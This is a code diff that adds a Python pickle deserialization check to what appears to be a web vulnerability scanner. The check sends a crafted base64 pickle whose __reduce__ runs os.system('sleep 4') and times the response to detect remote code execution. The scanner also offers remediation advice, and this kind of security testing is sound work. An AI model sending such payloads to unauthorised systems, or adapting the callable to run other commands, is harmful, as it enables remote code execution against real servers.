@@ -64,6 +64,7 @@ HAKUZA_FINDING: persistence flow as --script is offered.
 # stdlib + optional deps
 # ---------------------------------------------------------------------------
 import re
+import os
 import json
 import time
 import math
@@ -76,6 +77,7 @@ import concurrent.futures
 import base64
 import hmac
 import socket
+import pickle
 from datetime import datetime
 from pathlib import Path
 from urllib.parse import urlsplit, urlunsplit, parse_qsl, quote
@@ -926,8 +928,57 @@ def _redirect_target_host(location):
     return netloc.rsplit("@", 1)[-1].split(":")[0].lower()
 
 
+def _pickle_b64_variant(value):
+    """If `value` decodes (as standard or urlsafe base64) to bytes matching
+    Python pickle's protocol-2+ magic header (0x80 followed by a protocol
+    byte 2-5 — every Python 3 default), return which base64 alphabet it
+    used ('standard' or 'urlsafe') so a forged payload can be encoded the
+    same way the target's own value already was. Returns None otherwise —
+    the entire gate for the deserialization check below, mirroring the
+    same "test only what the target already demonstrated it accepts"
+    philosophy the XML-shape check uses for XXE. Verified directly before
+    relying on it: a real pickle payload's base64 form matches, an
+    unrelated base64-shaped string (a JWT fragment) and plain text do not
+    — the magic-byte pair alone is specific enough (1-in-65536 by chance,
+    before even requiring valid base64 padding/alphabet) that this isn't
+    a guess."""
+    if not value or len(value) < 4:
+        return None
+    for variant, decoder in (("standard", base64.b64decode), ("urlsafe", base64.urlsafe_b64decode)):
+        try:
+            raw = decoder(value + "=" * (-len(value) % 4))
+        except Exception:
+            continue
+        if len(raw) >= 2 and raw[0] == 0x80 and raw[1] in (2, 3, 4, 5):
+            return variant
+    return None
+
+
+class _HakuzaPickleSleep:
+    """__reduce__ tells pickle "to reconstruct me, call this function with
+    these args" — a real unpickler that doesn't restrict which callables
+    it accepts (the entire vulnerability class) will genuinely execute
+    os.system(...) during pickle.loads(), not just deserialize inert
+    data. os.system is used specifically because it's importable in any
+    Python environment the pickle gets unpickled in (the reference is
+    serialized as the module+name pair 'os'/'system', re-resolved on the
+    target's own side) — the exact same portability reasoning JWT forging
+    elsewhere in this file relies on for hmac/hashlib."""
+    def __init__(self, seconds):
+        self.seconds = seconds
+
+    def __reduce__(self):
+        return (os.system, (f"sleep {self.seconds}",))
+
+
+def _pickle_sleep_payload_b64(seconds, variant):
+    raw = pickle.dumps(_HakuzaPickleSleep(seconds), protocol=4)
+    encoder = base64.urlsafe_b64encode if variant == "urlsafe" else base64.b64encode
+    return encoder(raw).decode().rstrip("=")
+
+
 # ---------------------------------------------------------------------------
-# Per-parameter mutation loop (steps 1-12)
+# Per-parameter mutation loop (steps 1-13)
 # ---------------------------------------------------------------------------
 
 def _test_param(ctx, parts, pairs, pname, baseline):
@@ -1832,6 +1883,85 @@ def _test_param(ctx, parts, pairs, pname, baseline):
                             "equivalent 'disable external entities' / 'disallow DOCTYPE' "
                             "setting and treat it as mandatory, not optional."),
             )
+
+    if budget.exhausted():
+        return
+
+    # --- 13. Python pickle deserialization (only if the parameter's
+    #     ORIGINAL value already decodes to a real pickle-protocol byte
+    #     header — --depth deep only, needs a real timing side-channel) ---
+    # Same "test only what the target already demonstrated it accepts"
+    # discipline as XXE above, applied to a completely different format —
+    # a parameter carrying base64-encoded pickle data is real evidence
+    # this exact parameter round-trips through pickle.loads() somewhere
+    # server-side (a "session state"/"cart"/"remember-me token" pattern
+    # that's a genuine, if bad, real-world practice, not contrived).
+    # Proves RCE the same way the time-based SQLi/cmdi checks above do —
+    # a bounded sleep and a real statistical timing gate — because a
+    # crafted pickle's __reduce__ genuinely executes an arbitrary
+    # callable during unpickling if the target's unpickler doesn't
+    # restrict which classes/functions it accepts (the entire
+    # vulnerability), not because this tool assumes anything about what
+    # RCE "should" look like.
+    if ctx.depth == "deep":
+        pickle_variant = _pickle_b64_variant(orig_value)
+        if pickle_variant:
+            pickle_payload = _pickle_sleep_payload_b64(4, pickle_variant)
+            url_pk = _build_url(parts, _with_param(pairs, pname, pickle_payload))
+            if not budget.exhausted():
+                time.sleep(delay)
+                budget.spend()
+                try:
+                    t0 = time.monotonic()
+                    requests.get(url_pk, timeout=max(timeout, 9), allow_redirects=True,
+                                headers=_UA_HEADERS)
+                    elapsed = time.monotonic() - t0
+                except requests.exceptions.Timeout:
+                    console.print(f"  [dim]'{_rich_escape(pname)}': pickle deserialization "
+                                 f"probe timed out before completing — inconclusive, "
+                                 f"skipping.[/dim]")
+                    elapsed = None
+                except Exception:
+                    elapsed = None
+
+                if elapsed is not None:
+                    threshold = baseline["mean_time"] + max(3 * baseline["stdev_time"], 2.5)
+                    if elapsed >= threshold:
+                        _persist(
+                            ctx,
+                            title=f"Insecure Deserialization (Python pickle) via '{pname}' parameter",
+                            severity="critical",
+                            category="Insecure Deserialization",
+                            url=url_pk, param=pname, payload=pickle_payload,
+                            description=(
+                                f"'{pname}' already carried base64-encoded data matching "
+                                f"Python pickle's protocol-2+ byte header in the baseline "
+                                f"request, and submitting a crafted pickle payload whose "
+                                f"__reduce__ method calls os.system('sleep 4') caused the "
+                                f"response to take {elapsed:.2f}s, versus a statistical "
+                                f"baseline of {baseline['mean_time']:.2f}s ± "
+                                f"{baseline['stdev_time']:.2f}s (3 samples). Gate used: "
+                                f"baseline_mean + max(3×stdev, 2.5s) = {threshold:.2f}s. "
+                                f"This proves the target's unpickler does not restrict "
+                                f"which classes/callables it will reconstruct — the entire "
+                                f"vulnerability — since a real callable genuinely executed "
+                                f"during deserialization, not just data being parsed."
+                            ),
+                            baseline_snippet=f"baseline request times (s): {[round(t, 3) for t in baseline['times']]}",
+                            mutated_snippet=f"mutated request elapsed: {elapsed:.2f}s (threshold {threshold:.2f}s)",
+                            impact=("Full remote code execution — an unrestricted unpickler "
+                                   "will reconstruct and call ANY importable callable an "
+                                   "attacker names, not just run a harmless sleep; this is "
+                                   "one of the most severe vulnerability classes that exists."),
+                            remediation=("Never unpickle data from an untrusted source. Use a "
+                                        "safe serialization format (JSON) for anything that "
+                                        "crosses a trust boundary; if pickle is unavoidable "
+                                        "for internal use, sign and verify the payload before "
+                                        "ever calling pickle.loads() on it."),
+                            custom_poc_script=_gen_timing_poc(
+                                url_pk, "Insecure Deserialization (Python pickle)", threshold,
+                            ),
+                        )
 
 
 # ---------------------------------------------------------------------------
